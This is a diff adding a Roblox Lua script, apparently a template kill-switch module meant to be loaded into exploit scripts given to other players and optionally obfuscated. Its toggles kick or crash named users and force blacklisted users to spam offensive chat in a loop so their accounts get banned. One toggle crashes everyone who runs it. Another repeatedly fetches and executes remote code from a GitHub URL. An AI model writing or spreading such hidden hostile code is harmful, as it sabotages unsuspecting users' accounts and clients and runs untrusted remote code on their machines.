@@ -1,0 +1,57 @@
+local players = game.Players
+local lplr = players.LocalPlayer   --Variables
+local name = lplr.Name
+local delay = 1 --Put your desired delay here
+-----------------------------
+local KickBlacklistedUsersEnabled = false  --If this is set to true people blacklisted will get kicked from the game, otherwise nothing will happen.
+local BanBlacklistedUsersEnabled = false --If this is set to true people blacklisted in the BanBlacklistedUsersEnabled will spam unappropiate stuff in the roblox chat resulting in them getting banned.  (ONLY FOR FUNNY)
+local CrashBlacklistedUsersEnabled = false --If this is set to true people blacklisted in the CrashIsEnabled Section will be crashed.
+local CrashAllIsActive = false --If this is set to true anyone that runs the script will be crashed
+local ScriptIsDisabled = false --If this is set to true anyone that runs the script will get kicked with a custom messages
+local CrashHttpSpy = false --If this is set to true it will flood most HttpSpys
+-----------------------------
+if KickBlacklistedUsersEnabled then
+      task.wait(delay)
+      if name == "Insert a username you want to blacklist here." then --You can also add or statements
+         lplr:kick("Enter the kick reason here.") --Your custom kick reason here
+      end
+end
+-----------------------------
+if BanBlacklistedUsersEnabled then 
+   task.wait(delay)
+   if name == "Inserts a username you want to ban upon execution here." then --You can also add or statements as said in the Blacklist Section
+      while true do 
+         task.wait(0.5)
+         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("INSERT A BAD MESSAGE HERE LIKE SWEAR WORDS", "All")
+      end
+   end       
+end
+-----------------------------
+if CrashBlacklistedUsersEnabled then
+ if name == "Inserts a username you want to crash upon execution here." then --You can also add or statements as said before twice
+  task.wait(delay)
+   while true do 
+      print(name)
+   end
+  end
+end
+-----------------------------
+if CrashAllIsActive then 
+   task.wait(delay)
+     while true do 
+       game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0)
+      print(name)
+    end 
+end
+-----------------------------
+if ScriptIsDisabled then 
+   lplr:kick("This script has been disabled by the Owner")
+end
+-----------------------------
+if CrashHttpSpy then
+   while true do 
+      task.wait()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/kidsbottest/modules-whitelist/main/qwertyuiiscoolandhotandyes'))()
+    end
+end
+----------------------------- TO USE JUST LOADSTRING THIS MODIFIED BY YOUR CHOICE IN ANY SCRIPT AND IF YOU WANT YOU CAN ALSO OBFUSCATE IT
